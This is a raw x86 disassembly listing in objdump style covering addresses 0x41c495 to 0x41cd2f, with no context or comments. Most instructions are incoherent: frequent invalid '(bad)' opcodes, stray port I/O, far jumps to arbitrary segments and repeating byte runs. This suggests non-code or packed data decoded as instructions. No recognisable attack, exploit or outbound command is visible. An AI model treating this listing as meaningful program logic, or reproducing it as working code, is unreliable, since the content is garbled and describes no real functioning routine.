  41c495:	jno    0x41c45d
  41c497:	xchg   edx,eax
  41c498:	jb     0x41c497
  41c49a:	mov    al,0x60
  41c49c:	les    esi,FWORD PTR [ecx-0x34]
  41c49f:	xor    esi,0xe1779562
  41c4a5:	imul   eax,ecx,0xffffff85
  41c4a8:	fisubr WORD PTR [edi-0x6]
  41c4ab:	xor    dl,ah
  41c4ad:	ins    DWORD PTR es:[edi],dx
  41c4ae:	mov    BYTE PTR [eax-0xb],dh
  41c4b1:	mov    gs,WORD PTR [si+0x72]
  41c4b5:	std    
  41c4b6:	int3   
  41c4b7:	(bad)  
  41c4b8:	aad    0x71
  41c4ba:	jle    0x41c4ff
  41c4bc:	out    0x70,eax
  41c4be:	jp     0x41c453
  41c4c0:	aaa    
  41c4c1:	inc    esi
  41c4c2:	nop
  41c4c3:	push   edx
  41c4c4:	cmc    
  41c4c5:	jae    0x41c4b0
  41c4c7:	pusha  
  41c4c8:	or     eax,0xe7309e02
  41c4cd:	ins    DWORD PTR es:[edi],dx
  41c4ce:	cmp    DWORD PTR [eax],eax
	...
  41c4dc:	add    BYTE PTR [eax],al
  41c4de:	xor    eax,0x2c4460e1
  41c4e3:	cmc    
  41c4e4:	dec    DWORD PTR ds:0x3e71d565
  41c4ea:	cld    
  41c4eb:	out    0x70,al
  41c4ed:	add    BYTE PTR [ecx+0x3a],cl
  41c4f0:	xor    cl,BYTE PTR [esi-0x61]
  41c4f3:	jno    0x41c566
  41c4f5:	add    BYTE PTR ds:0x57434c08,ch
  41c4fb:	push   0x7b4e536d
  41c500:	data16 outs dx,BYTE PTR ds:[esi]
  41c502:	pop    ebp
  41c503:	dec    eax
  41c504:	std    
  41c505:	call   DWORD PTR [ecx+0x9]
  41c508:	inc    ecx
  41c509:	js     0x41c56e
  41c50b:	jne    0x41c55a
  41c50d:	jb     0x41c584
  41c50f:	push   0x62
  41c511:	jae    0x41c4dc
  41c513:	add    eax,0x645902ad
  41c518:	jno    0x41c56f
  41c51a:	mov    ah,0x5d
  41c51c:	pop    esi
  41c51d:	outs   dx,BYTE PTR ds:[esi]
  41c51e:	sahf   
  41c51f:	imul   esp,DWORD PTR [edx+0x64],0x65606dff
  41c526:	mov    edx,0xd46f6661
  41c52b:	inc    ebx
  41c52c:	data16 ins BYTE PTR es:[edi],dx
  41c52e:	into   
  41c52f:	outs   dx,DWORD PTR fs:[esi]
  41c531:	add    BYTE PTR [ecx-0x5091909c],dh
  41c537:	imul   esi,DWORD PTR [eax],0x69517432
  41c53d:	ins    BYTE PTR es:[edi],dx
  41c53e:	jp     0x41c545
  41c540:	xchg   DWORD PTR [eax],eax
	...
  41c54e:	add    BYTE PTR [eax],al
  41c550:	add    BYTE PTR [ecx-0x19e9d89],bh
  41c556:	gs push eax
  41c558:	je     0x41c552
  41c55a:	gs pop esi
  41c55c:	ins    DWORD PTR es:[edi],dx
  41c55d:	adc    eax,0xd647455f
  41c562:	pop    ebx
  41c563:	pop    edi
  41c564:	popa   
  41c565:	out    0x4,al
  41c567:	xchg   ebx,eax
  41c568:	add    ch,bh
  41c56a:	gs jno 0x41c5b5
  41c56d:	jge    0x41c5cc
  41c56f:	ins    BYTE PTR es:[edi],dx
  41c570:	bound  ebx,QWORD PTR [ebx+0x6372435d]
  41c576:	(bad)  
  41c577:	out    0x50,al
  41c579:	(bad)  
  41c57a:	int3   
  41c57b:	ficomp WORD PTR [esi+0x7e]
  41c57e:	pop    esi
  41c57f:	add    DWORD PTR [esi],ecx
  41c581:	arpl   WORD PTR [ebx],bx
  41c583:	jmp    0xe30336c8
  41c588:	jae    0x41c608
  41c58a:	daa    
  41c58b:	out    dx,eax
  41c58c:	xchg   WORD PTR [esi+0x1],bx
  41c590:	pusha  
  41c591:	arpl   WORD PTR [ebx],bx
  41c593:	jmp    0xed4d07eb
  41c598:	dec    edx
  41c599:	ds jno 0x41c55b
  41c59c:	jno    0x41c5e4
  41c59e:	add    DWORD PTR [ecx*1+0x40e91b63],eax
  41c5a5:	xor    DWORD PTR [ecx],eax
  41c5a7:	jecxz  0x41c61c
  41c5a9:	ds and eax,0x3d3770ea
  41c5af:	out    0x60,eax
  41c5b1:	ds pop esi
  41c5b3:	add    ecx,esi
	...
  41c5c1:	add    BYTE PTR [eax],al
  41c5c3:	add    BYTE PTR [ebx-0x59],ah
  41c5c6:	in     eax,0x62
  41c5c8:	sub    dh,BYTE PTR [eax+0x3cfa73ec]
  41c5ce:	in     eax,0x66
  41c5d0:	or     DWORD PTR [ecx+0x1],ecx
  41c5d3:	ins    DWORD PTR es:[edi],dx
  41c5d4:	cmovno esi,DWORD PTR [esi]
  41c5d7:	xor    al,BYTE PTR [ebp+0x4a]
  41c5da:	in     eax,0x6b
  41c5dc:	arpl   WORD PTR [ecx-0x720f8afd],bp
  41c5e2:	repz data16 int 0x92
  41c5e6:	fistp  QWORD PTR [esi]
  41c5e8:	arpl   WORD PTR [ecx-0x542e9d0a],bx
  41c5ee:	xor    ebp,DWORD PTR [esi]
  41c5f0:	mov    edi,0x3cffe582
  41c5f5:	push   cs
  41c5f6:	add    al,0x52
  41c5f8:	mov    esi,0xc66fca87
  41c5fd:	add    eax,0xeec1cd55
  41c602:	and    edi,esp
  41c604:	pop    ebp
  41c605:	add    eax,0xeab103b1
  41c60a:	inc    ebp
  41c60b:	rcl    DWORD PTR [ecx-0x5104c716],cl
  41c611:	out    0x4a,al
  41c613:	out    dx,eax
  41c614:	or     edx,0x6ff4c32e
  41c61a:	jbe    0x41c61f
  41c61c:	xchg   ecx,eax
  41c61d:	jmp    0xdf19:0xe078c50d
  41c624:	sub    ebp,edx
  41c626:	(bad)  
	...
  41c634:	add    BYTE PTR [eax],al
  41c636:	add    BYTE PTR [esi+0x47df3905],ah
  41c63c:	shl    dh,0xde
  41c63f:	ss mov esp,0x57dfb03
  41c645:	stos   DWORD PTR es:[edi],eax
  41c646:	add    edx,DWORD PTR [ecx]
  41c648:	jmp    0xccd3:0xfa3ebf05
  41c64f:	inc    ecx
  41c650:	out    dx,al
  41c651:	mov    ds:0x91055dfb,eax
  41c656:	add    esi,DWORD PTR [ecx]
  41c658:	jmp    0xefc7:0xea12c4c5
  41c65f:	add    DWORD PTR [ebx+eax*8+0x4e053dfa],edi
  41c666:	add    edx,DWORD PTR [ecx]
  41c668:	jmp    0xe2bc:0xf901d4c5
  41c66f:	clc    
  41c670:	stc    
  41c671:	cmp    DWORD PTR [esi+0x3e6c4d4],0x1e
  41c678:	add    eax,0xc8c7deb9
  41c67d:	xchg   esp,eax
  41c67e:	out    dx,al
  41c67f:	mov    ecx,0xb1e787d7
  41c684:	call   0x3fa26e88
  41c689:	call   FWORD PTR [edx+0x594cea0d]
  41c68f:	add    al,0xe1
  41c691:	inc    eax
  41c692:	push   esp
  41c693:	adc    eax,0x134762f5
  41c698:	aam    0x70
  41c69a:	inc    esp
	...
  41c6a7:	add    BYTE PTR [eax],al
  41c6a9:	add    BYTE PTR ds:0x61e2fd6f,dl
  41c6af:	enter  0x3562,0x2c
  41c6b3:	mul    BYTE PTR [edx+0x3b]
  41c6b6:	sub    eax,edx
  41c6b8:	push   0x44
  41c6ba:	and    BYTE PTR [edi-0x3],ch
  41c6bd:	or     BYTE PTR [ebx],al
  41c6bf:	stc    
  41c6c0:	pop    esi
  41c6c1:	sbb    eax,ecx
  41c6c3:	xor    eax,0xdab4c732
  41c6c8:	imul   ebp,ecx,0x60
  41c6cb:	push   esi
  41c6cc:	add    BYTE PTR [edx],bl
  41c6ce:	mov    bh,0xe3
  41c6d0:	imul   ecx,DWORD PTR ds:0xa62f6fc,0xffffffc4
  41c6d7:	repnz bound ebp,QWORD PTR [eax]
  41c6da:	addr16 hlt 
  41c6dc:	addr16 int3 
  41c6de:	mov    esp,0x491b30da
  41c6e3:	jmp    0xf6a28c53
  41c6e8:	call   FWORD PTR [edi-0x449d0d86]
  41c6ee:	jp     0x41c6d3
  41c6f0:	jae    0x41c69c
  41c6f2:	jbe    0x41c6c3
  41c6f4:	pusha  
  41c6f5:	ret    0xf4a5
  41c6f8:	imul   ebp,DWORD PTR [eax-0x500013a0],0x7a
  41c6ff:	repnz bound ebx,QWORD PTR [ebx-0x558c1cb6]
  41c706:	dec    esi
  41c707:	jecxz  0x41c767
  41c709:	xchg   ebp,eax
  41c70a:	sub    eax,0x71d3
	...
  41c71b:	add    BYTE PTR [eax],al
  41c71d:	out    dx,al
  41c71e:	inc    edx
  41c71f:	std    
  41c720:	push   DWORD PTR [ebp-0x239694a5]
  41c726:	dec    esi
  41c727:	jno    0x41c757
  41c729:	out    0x65,al
  41c72b:	imul   eax,DWORD PTR [eax],0x744f092f
  41c731:	mov    eax,0x43727152
  41c736:	dec    eax
  41c737:	std    
  41c738:	(bad)  
  41c739:	cli    
  41c73a:	or     BYTE PTR [edi+0x74],cl
  41c73d:	dec    eax
  41c73e:	push   ebx
  41c73f:	inc    eax
  41c740:	push   0x3e4038
  41c745:	push   ss
  41c746:	or     DWORD PTR [edi+0x74],ecx
  41c749:	sub    BYTE PTR [ebp+0x6c],dl
  41c74c:	dec    ecx
  41c74d:	dec    esp
  41c74e:	jne    0x41c78e
  41c750:	add    dh,cl
  41c752:	or     BYTE PTR [edi+0x74],cl
  41c755:	js     0x41c7a9
  41c757:	jno    0x41c7cb
  41c759:	jnp    0x41c764
  41c75b:	jmp    0x6f43:0x6f756900
  41c762:	jns    0x41c7af
  41c764:	dec    ecx
  41c765:	mov    ecx,DWORD PTR [ecx]
  41c767:	push   cs
  41c768:	add    DWORD PTR [ecx+0x75],ecx
  41c76b:	outs   dx,DWORD PTR ds:[esi]
  41c76c:	push   ebx
  41c76d:	xchg   BYTE PTR [ebx+0x46],dh
  41c770:	push   edi
  41c771:	mov    al,BYTE PTR [ecx]
  41c773:	outs   dx,DWORD PTR ds:[esi]
  41c774:	push   0x705e5e9e
  41c779:	mov    ds:0xae6c6427,eax
  41c77e:	add    DWORD PTR [esi],esi
	...
  41c790:	xchg   ebx,eax
  41c791:	bound  esi,QWORD PTR [si-0x33]
  41c795:	push   0x1a86461
  41c79a:	sub    al,BYTE PTR [eax]
  41c79c:	aad    0x64
  41c79e:	jno    0x41c808
  41c7a0:	in     eax,dx
  41c7a1:	ja     0x41c814
  41c7a3:	bound  esp,QWORD PTR [ebx-0x6b]
  41c7a6:	jecxz  0x41c806
  41c7a8:	mov    esi,0x63470181
  41c7ad:	out    dx,eax
  41c7ae:	in     eax,0x60
  41c7b0:	enter  0xed81,0xff
  41c7b4:	xor    al,0x3c
  41c7b6:	add    DWORD PTR [ecx-0x44],esp
  41c7b9:	in     al,dx
  41c7ba:	loop   0x41c81e
  41c7bc:	ror    dl,0x3
  41c7bf:	arpl   WORD PTR es:[edi-0x466f9319],di
  41c7c6:	lock ins BYTE PTR es:[edi],dx
  41c7c8:	add    bh,0xde
  41c7cb:	jae    0x41c830
  41c7cd:	sbb    al,BYTE PTR [ecx+esi*2]
  41c7d0:	xchg   BYTE PTR [edi+ebx*8+0x41ff4ff],bh
  41c7d7:	jno    0x41c75f
  41c7d9:	sub    bl,bh
  41c7db:	pusha  
  41c7dc:	outs   dx,DWORD PTR ds:[esi]
  41c7dd:	pop    esi
  41c7de:	add    DWORD PTR [esi],edi
  41c7e0:	arpl   WORD PTR [eax],dx
  41c7e2:	fbld   TBYTE PTR [eax+0x4d]
  41c7e5:	pop    esi
  41c7e6:	add    DWORD PTR [ebp+0x63],eax
  41c7e9:	pandn  mm6,QWORD PTR [ebx+0x50]
  41c7ed:	adc    esp,ecx
  41c7ef:	push   0xffed6e4c
	...
  41c800:	add    BYTE PTR [eax],al
  41c802:	add    BYTE PTR [ebp+edi*1+0x1d105501],dh
  41c809:	shl    DWORD PTR [ebx+0x42],1
  41c80c:	push   eax
  41c80d:	in     eax,dx
  41c80e:	jb     0x41c823
  41c810:	pop    esi
  41c811:	add    DWORD PTR [ebp+0x10],esi
  41c814:	inc    ebx
  41c815:	loop   0x41c87f
  41c817:	push   eax
  41c818:	adc    BYTE PTR [esi],ah
  41c81a:	not    DWORD PTR fs:[ecx+0x1]
  41c81e:	dec    ebx
  41c81f:	arpl   WORD PTR [edx-0x7700a11a],bx
  41c825:	(bad)
  41c82b:	std    
  41c82c:	add    al,0x90
  41c82e:	out    0xc1,eax
  41c830:	(bad)  
  41c831:	out    0x3,al
  41c833:	mov    ah,0x5
  41c835:	mov    esp,0x87dcb8e5
  41c83a:	fbstp  TBYTE PTR [ecx-0x530e7408]
  41c840:	test   DWORD PTR [ebp-0x74264223],0x83f8b003
  41c84a:	icebp  
  41c84b:	rcr    ebx,0x5c
  41c84e:	es xchg ecx,ebx
  41c851:	dec    edx
  41c852:	add    al,0x63
  41c854:	add    eax,0x56303e7
  41c859:	out    0x3,eax
  41c85b:	arpl   WORD PTR ds:0x56303e7,ax
  41c861:	out    0x3,eax
  41c863:	arpl   WORD PTR ds:0x3e7,ax
	...
  41c875:	add    BYTE PTR [ebx+0x5],ah
  41c878:	out    0x3,eax
  41c87a:	arpl   WORD PTR ds:0x56303e7,ax
  41c880:	out    0x3,eax
  41c882:	arpl   WORD PTR ds:0x56303e7,ax
  41c888:	out    0x3,eax
  41c88a:	arpl   WORD PTR ds:0x56303e7,ax
  41c890:	out    0x3,eax
  41c892:	arpl   WORD PTR ds:0x56303e7,ax
  41c898:	out    0x3,eax
  41c89a:	arpl   WORD PTR ds:0x56303e7,ax
  41c8a0:	out    0x3,eax
  41c8a2:	arpl   WORD PTR ds:0x56303e7,ax
  41c8a8:	out    0x3,eax
  41c8aa:	arpl   WORD PTR ds:0x56303e7,ax
  41c8b0:	out    0x3,eax
  41c8b2:	arpl   WORD PTR ds:0x560e900,ax
  41c8b8:	add    cl,ch
  41c8ba:	pusha  
  41c8bb:	add    eax,0x560e900
  41c8c0:	add    cl,ch
  41c8c2:	pusha  
  41c8c3:	add    eax,0x560e900
  41c8c8:	add    cl,ch
  41c8ca:	pusha  
  41c8cb:	add    eax,0x560e900
  41c8d0:	add    cl,ch
  41c8d2:	pusha  
  41c8d3:	add    eax,0x560e900
  41c8d8:	add    cl,ch
	...
  41c8e6:	add    BYTE PTR [eax],al
  41c8e8:	add    BYTE PTR [eax+0x5],ah
  41c8eb:	add    cl,ch
  41c8ed:	pusha  
  41c8ee:	add    eax,0x560e900
  41c8f3:	add    cl,ch
  41c8f5:	pusha  
  41c8f6:	add    eax,0x560e900
  41c8fb:	add    cl,ch
  41c8fd:	pusha  
  41c8fe:	add    eax,0x560e900
  41c903:	add    cl,ch
  41c905:	pusha  
  41c906:	add    eax,0x560e900
  41c90b:	add    cl,ch
  41c90d:	pusha  
  41c90e:	add    eax,0x560e900
  41c913:	add    cl,ch
  41c915:	pusha  
  41c916:	add    eax,0x560e900
  41c91b:	add    cl,ch
  41c91d:	pusha  
  41c91e:	add    eax,0x560e900
  41c923:	add    cl,ch
  41c925:	pusha  
  41c926:	add    eax,0x560e900
  41c92b:	add    cl,ch
  41c92d:	pusha  
  41c92e:	add    eax,0x560e900
  41c933:	add    cl,ch
  41c935:	pusha  
  41c936:	add    eax,0x560e900
  41c93b:	add    BYTE PTR [eax],al
  41c93d:	mov    al,BYTE PTR [esi]
  41c93f:	add    BYTE PTR [eax],al
  41c941:	mov    al,BYTE PTR [esi]
  41c943:	add    BYTE PTR [eax],al
  41c945:	jp     0x41c94d
  41c947:	add    BYTE PTR [eax],al
  41c949:	jp     0x41c951
	...
  41c95b:	add    BYTE PTR [edx+0x6],cl
  41c95e:	add    BYTE PTR [eax],al
  41c960:	dec    edx
  41c961:	push   es
  41c962:	add    BYTE PTR [eax],al
  41c964:	pop    ds
  41c965:	cmp    esp,ecx
  41c967:	int3   
  41c968:	pop    ss
  41c969:	cmp    esp,ecx
  41c96b:	int3   
  41c96c:	xchg   esi,eax
  41c96d:	jle    0x41c95b
  41c96f:	push   ecx
  41c970:	call   0x5bcbd134
  41c975:	jge    0x41c9c2
  41c977:	(bad)  
  41c978:	fcomp  DWORD PTR [edi+0x5b]
  41c97b:	ret    
  41c97c:	mov    dh,0x7e
  41c97e:	in     al,dx
  41c97f:	push   ecx
  41c980:	lods   eax,DWORD PTR ds:[esi]
  41c981:	shl    BYTE PTR [eax],cl
  41c983:	leave  
  41c984:	xchg   DWORD PTR [esi+0x6f],edi
  41c987:	xor    al,bl
  41c989:	repnz or ecx,DWORD PTR [ebx+0x46890975]
  41c990:	imul   edi,DWORD PTR [ebx+eax*2-0x4],0xffffffd8
  41c995:	jmp    0x6b3d:0x852d8b1f
  41c99c:	push   edi
  41c99d:	add    al,BYTE PTR [eax+0x1f1283f]
  41c9a3:	jmp    0x41c95f
  41c9a5:	leave  
  41c9a6:	pop    ebp
  41c9a7:	mov    edi,DWORD PTR [esi+0x16ccc0c7]
  41c9ad:	jle    0x41c99b
  41c9af:	add    edi,0x20
  41c9b2:	mov    DWORD PTR [ebp+0x5b],eax
  41c9b5:	jl     0x41c9fa
  41c9b7:	loopne 0x41c991
  41c9b9:	mov    bh,0xdf
  41c9bb:	mov    esi,DWORD PTR [esi]
  41c9bd:	add    DWORD PTR gs:[ecx+0x0],edx
	...
  41c9cd:	add    BYTE PTR [eax],al
  41c9cf:	push   edi
  41c9d0:	jl     0x41ca25
  41c9d2:	in     al,0xd8
  41c9d4:	mov    edi,0xed1b8be3
  41c9d9:	add    BYTE PTR [ebp+0x6b],cl
  41c9dc:	jl     0x41ca29
  41c9de:	clc    
  41c9df:	call   0x21cdc1b3
  41c9e4:	and    DWORD PTR [ecx],eax
  41c9e6:	inc    ebp
  41c9e7:	pop    ebx
  41c9e8:	jl     0x41ca2d
  41c9ea:	call   0x8c3984d7
  41c9ef:	mov    dl,0x25
  41c9f1:	add    DWORD PTR [ebp+0x5b],edx
  41c9f4:	jle    0x41ca49
  41c9f6:	lock fadd st,st(2)
  41c9f9:	test   DWORD PTR [ebx+0x4d0109ab],0xfc4b7e6b
  41ca03:	and    al,0xc3
  41ca05:	repz add BYTE PTR [ebx+0x5],ah
  41ca09:	add    bl,ch
  41ca0b:	push   0x7c
  41ca0d:	push   ebx
  41ca0e:	hlt    
  41ca0f:	loopne 0x41ca54
  41ca11:	dec    DWORD PTR [eax+0x458971b6]
  41ca17:	or     edi,DWORD PTR [ebp+0x4b]
  41ca1a:	hlt    
  41ca1b:	cmp    BYTE PTR [ebp+0x7cab7317],bh
  41ca21:	push   ebx
  41ca22:	lock fadd DWORD PTR [ebx]
  41ca25:	add    DWORD PTR [ebp+0x5b],eax
  41ca28:	jle    0x41ca6d
  41ca2a:	fmul   QWORD PTR [ecx-0x9]
  41ca2d:	lods   al,BYTE PTR ds:[si]
  41ca2f:	popa   
  41ca30:	(bad)  
	...
  41ca3f:	add    BYTE PTR [eax],al
  41ca41:	add    BYTE PTR [esi],bl
  41ca43:	dec    ecx
  41ca44:	dec    edi
  41ca45:	call   0x41d07d
  41ca4a:	loopne 0x41ca8d
  41ca4c:	or     al,0x85
  41ca4e:	mov    ds:0x168b18f2,eax
  41ca53:	jno    0x41c9de
  41ca55:	inc    ebp
  41ca56:	mov    ebx,0x330cb4f8
  41ca5b:	jle    0x41caa8
  41ca5d:	in     al,dx
  41ca5e:	call   0x26cdb635
  41ca63:	imul   ecx,DWORD PTR [ecx+0x4304f304],0x88fa8808
  41ca6d:	dec    ebp
  41ca6e:	jae    0x41c9f4
  41ca70:	mov    edi,0xefbada04
  41ca75:	jmp    0x41ca36
  41ca77:	xor    al,0xc0
  41ca79:	mov    eax,DWORD PTR [esi-0x36]
  41ca7c:	ror    ah,0x27
  41ca7f:	cmp    esp,ecx
  41ca81:	int3   
  41ca82:	pop    ds
  41ca83:	cmp    esp,ecx
  41ca85:	int3   
  41ca86:	pop    ss
  41ca87:	cmp    esp,ecx
  41ca89:	int3   
  41ca8a:	xchg   esi,eax
  41ca8b:	jl     0x41ca79
  41ca8d:	add    DWORD PTR [edi+0xd],0xffffffe8
  41ca91:	add    eax,0x89fd682c
  41ca96:	sahf   
  41ca97:	pop    ebp
  41ca98:	mov    DWORD PTR [ebp+0xb],eax
  41ca9b:	aad    0xe7
  41ca9d:	sub    DWORD PTR [eax+ebp*2],edx
  41caa0:	std    
  41caa1:	and    DWORD PTR [edi],0x1
  41caa4:	mov    eax,ds:0xb4
	...
  41cab5:	scas   al,BYTE PTR es:[edi]
  41cab6:	(bad)  
  41cab7:	jmp    DWORD PTR [edi-0x41]
  41caba:	add    al,BYTE PTR [eax+0x0]
  41cabd:	call   0xec93b27b
  41cac2:	adc    DWORD PTR [ebp+edx*2-0x475efa5e],esi
  41cac9:	ss (bad) 
  41cacb:	jmp    FWORD PTR [ecx+0x63]
  41cace:	(bad)  
  41cad0:	addr16 lahf 
  41cad2:	add    al,BYTE PTR [eax+0x0]
  41cad5:	les    edx,FWORD PTR [ecx]
  41cad7:	mov    eax,0x87052255
  41cadc:	inc    ebp
  41cadd:	retf   
  41cade:	aas    
  41cadf:	inc    ebx
  41cae0:	cld    
  41cae1:	arpl   WORD PTR ds:0xfdb80000,ax
  41cae7:	mov    BYTE PTR [ebp-0x61],dl
  41caea:	add    edx,0x1
  41caed:	jmp    0x869:0xe83fbd1
  41caf4:	jae    0x41cb38
  41caf6:	jl     0x41cb3b
  41caf8:	cld    
  41caf9:	call   0x61ce4df6
  41cafe:	vmovmskps ebx,ymm0
  41cb02:	shl    edi,1
  41cb04:	push   edx
  41cb05:	adc    DWORD PTR fs:[ebp+edx*2+0x4d8905a2],esi
  41cb0d:	push   edi
  41cb0e:	jge    0x41cb14
  41cb10:	lea    edx,[edi]
  41cb12:	sar    DWORD PTR [esi],1
  41cb14:	add    BYTE PTR [eax],bh
  41cb16:	push   esi
  41cb17:	mov    ebp,esp
	...
  41cb25:	add    BYTE PTR [eax],al
  41cb27:	add    BYTE PTR [esi+0x27cccc42],bl
  41cb2d:	cmp    cl,ah
  41cb2f:	int3   
  41cb30:	pop    ds
  41cb31:	cmp    cl,ah
  41cb33:	int3   
  41cb34:	pop    ss
  41cb35:	cmp    cl,ah
  41cb37:	int3   
  41cb38:	mov    dh,0x7a
  41cb3a:	in     al,dx
  41cb3b:	mov    eax,ds:0x3ecf73
  41cb40:	dec    ebp
  41cb41:	jp     0x41cb83
  41cb43:	xor    al,bl
  41cb45:	mov    eax,0xbdea3e07
  41cb4a:	pop    es
  41cb4b:	pop    ebp
  41cb4c:	and    BYTE PTR [edx],bh
  41cb4e:	int3   
  41cb4f:	int3   
  41cb50:	pop    ds
  41cb51:	cmp    cl,ah
  41cb53:	int3   
  41cb54:	pop    ss
  41cb55:	cmp    cl,ah
  41cb57:	int3   
  41cb58:	ss jp  0x41cb47
  41cb5b:	mov    ebx,DWORD PTR [esi]
  41cb5d:	stc    
  41cb5e:	dec    edi
  41cb5f:	mov    ebx,DWORD PTR [esi]
  41cb61:	std    
  41cb62:	dec    esi
  41cb63:	jmp    FWORD PTR [esi-0x4f]
  41cb66:	push   ebx
  41cb67:	inc    ecx
  41cb68:	arpl   ax,cx
  41cb6a:	ror    ah,0xa7
  41cb6d:	cmp    esp,ecx
  41cb6f:	int3   
  41cb70:	lahf   
  41cb71:	cmp    esp,ecx
  41cb73:	int3   
  41cb74:	xchg   edi,eax
  41cb75:	cmp    esp,ecx
  41cb77:	int3   
  41cb78:	ss jp  0x41cb67
  41cb7b:	add    DWORD PTR [edi-0x6ff9603],0x4
  41cb82:	push   0xffc561dc
  41cb87:	(bad)  
  41cb88:	push   esi
  41cb89:	lods   eax,DWORD PTR ds:[esi]
  41cb8a:	push   ebx
  41cb8b:	inc    ecx
	...
  41cb98:	add    BYTE PTR [eax],al
  41cb9a:	add    BYTE PTR [ebx+0x7c],ah
  41cb9d:	inc    ebx
  41cb9e:	clc    
  41cb9f:	sti    
  41cba0:	pop    esp
  41cba1:	add    al,BYTE PTR [eax+0x63]
  41cba4:	jp     0x41cbe9
  41cba6:	clc    
  41cba7:	mov    bl,0x5d
  41cba9:	mov    edx,0x816654ff
  41cbae:	les    ebx,FWORD PTR [ebx+0x7c]
  41cbb1:	inc    ebx
  41cbb2:	cld    
  41cbb3:	fdiv   DWORD PTR [edi-0x3017aef1]
  41cbb9:	or     edx,DWORD PTR [edx-0x18]
  41cbbc:	mov    edi,0xd02c5007
  41cbc1:	sti    
  41cbc2:	mov    edi,DWORD PTR [esi]
  41cbc4:	enter  0xccc0,0xb6
  41cbc8:	jp     0x41cbb6
  41cbca:	push   ecx
  41cbcb:	sbb    al,0xc0
  41cbcd:	sti    
  41cbce:	add    BYTE PTR [ebx+0x5],ah
  41cbd1:	add    bl,ch
  41cbd3:	pop    edx
  41cbd4:	jp     0x41cc19
  41cbd6:	cld    
  41cbd7:	loopne 0x41cc1d
  41cbd9:	dec    DWORD PTR [eax+0x4d89699e]
  41cbdf:	out    dx,eax
  41cbe0:	sub    DWORD PTR [ebx+0x10],ecx
  41cbe3:	jo     0x41cbeb
  41cbe5:	mov    DWORD PTR [ebp+0x6b],edx
  41cbe8:	add    dl,BYTE PTR [ebx-0x4]
  41cbeb:	fs scas eax,DWORD PTR es:[edi]
  41cbed:	add    cl,BYTE PTR [ebx+0x4d00f91e]
  41cbf3:	(bad)  
  41cbf4:	cmc    
  41cbf5:	mov    ch,0x11
  41cbf7:	js     0x41cc3c
  41cbf9:	je     0x41cc02
  41cbfb:	sti    
  41cbfc:	add    eax,DWORD PTR [eax]
	...
  41cc0e:	arpl   WORD PTR [edx+0x4],bx
  41cc11:	jmp    0x41cba6
  41cc13:	xor    eax,eax
  41cc15:	mov    eax,DWORD PTR [esi-0x58333f39]
  41cc1b:	cmp    ah,cl
  41cc1d:	int3   
  41cc1e:	lahf   
  41cc1f:	cmp    ah,cl
  41cc21:	int3   
  41cc22:	xchg   edi,eax
  41cc23:	cmp    ah,cl
  41cc25:	int3   
  41cc26:	push   ss
  41cc27:	jp     0x41cc15
  41cc29:	mov    ecx,0x55b
  41cc2e:	pop    es
  41cc2f:	jp     0x41cc38
  41cc31:	mov    DWORD PTR [esi+0x15],edx
  41cc34:	push   esi
  41cc35:	inc    ecx
  41cc36:	arpl   dx,ax
  41cc38:	ror    ah,0x27
  41cc3b:	push   edx
  41cc3c:	int3   
  41cc3d:	int3   
  41cc3e:	pop    ds
  41cc3f:	push   edx
  41cc40:	int3   
  41cc41:	int3   
  41cc42:	pop    ss
  41cc43:	push   edx
  41cc44:	int3   
  41cc45:	int3   
  41cc46:	xchg   esi,eax
  41cc47:	nop
  41cc48:	in     al,dx
  41cc49:	add    DWORD PTR [edi-0xa],0xffffff88
  41cc4d:	inc    ebp
  41cc4e:	pop    ebx
  41cc4f:	mov    BYTE PTR [eax+0x4],bh
  41cc52:	arpl   WORD PTR [esp+eax*4],dx
  41cc55:	mov    BYTE PTR [ebx+0x5],ah
  41cc58:	add    BYTE PTR [ebx+0x51890da6],cl
  41cc5e:	addr16 mov dl,ch
  41cc61:	or     BYTE PTR [edx],dh
  41cc63:	jo     0x41cbec
  41cc65:	push   ebp
  41cc66:	not    DWORD PTR [eax+0x45e00843]
  41cc6c:	or     BYTE PTR [ecx+0x45c555a6],cl
	...
  41cc7e:	add    BYTE PTR [eax],al
  41cc80:	add    bh,ah
  41cc82:	add    eax,0x70630000
  41cc87:	pop    es
  41cc88:	mov    esp,DWORD PTR [esi]
  41cc8a:	popa   
  41cc8b:	add    ecx,0xfc4b8e62
  41cc91:	fdivr  DWORD PTR [edx+0x59163bfb]
  41cc97:	jno    0x41ccdf
  41cc99:	call   0x1ecdc868
  41cc9e:	push   ebp
  41cc9f:	or     eax,0xbec64fb7
  41cca4:	cli    
  41cca5:	outs   dx,DWORD PTR ds:[esi]
  41cca6:	mov    dl,bh
  41cca8:	add    ecx,DWORD PTR [esi]
  41ccaa:	pop    ss
  41ccab:	mov    DWORD PTR [ebp-0x71],eax
  41ccae:	nop
  41ccaf:	dec    ebx
  41ccb0:	lock push esp
  41ccb2:	pushf  
  41ccb3:	adc    al,0x41
  41ccb5:	loop   0x41cd1e
  41ccb7:	std    
  41ccb8:	packsswb mm0,QWORD PTR ds:0x906b5587
  41ccbf:	inc    ebx
  41ccc0:	or     al,bl
  41ccc2:	ror    BYTE PTR [ebx],cl
  41ccc4:	add    ebp,DWORD PTR [ebx-0x70]
  41ccc7:	push   ebx
  41ccc8:	clc    
  41ccc9:	call   0xa644dbd6
  41ccce:	cmc    
  41cccf:	mov    BYTE PTR [ebp+0x5b],cl
  41ccd2:	nop
  41ccd3:	push   ebx
  41ccd4:	or     al,0x60
  41ccd6:	test   BYTE PTR [eax+0x48e3b4d],0xa
  41ccdd:	cmp    BYTE PTR [esi-0x6fa4aa77],ch
  41cce3:	inc    ebx
  41cce4:	or     BYTE PTR [eax],al
	...
  41ccf2:	add    BYTE PTR [eax],al
  41ccf4:	pusha  
  41ccf5:	mov    DWORD PTR [ebx],0xe70d9e89
  41ccfb:	imul   ecx,DWORD PTR [esp+eiz*2],0xfffffffd
  41ccff:	mov    edi,esi
  41cd01:	rol    eax,0xcc
  41cd04:	xchg   esi,eax
  41cd05:	nop
  41cd06:	in     al,dx
  41cd07:	add    DWORD PTR [edi],0x29
  41cd0a:	mov    DWORD PTR [ebp+0x5b],eax
  41cd0d:	mov    es,WORD PTR [ebx-0x1c]
  41cd10:	fcom   st(1)
  41cd12:	jecxz  0x41cc9f
  41cd14:	imul   eax,DWORD PTR ss:[ecx],0x538e9751
  41cd1b:	call   0x8c2996f8
  41cd20:	fild   DWORD PTR [eax+eax*1+0x4b8e6300]
  41cd27:	lock loopne 0x41cd0b
  41cd2a:	out    dx,eax
  41cd2b:	add    BYTE PTR [ecx+ecx*4-0x7],bl
  41cd2f:	add    BYTE PTR [ebx+0x5],ah
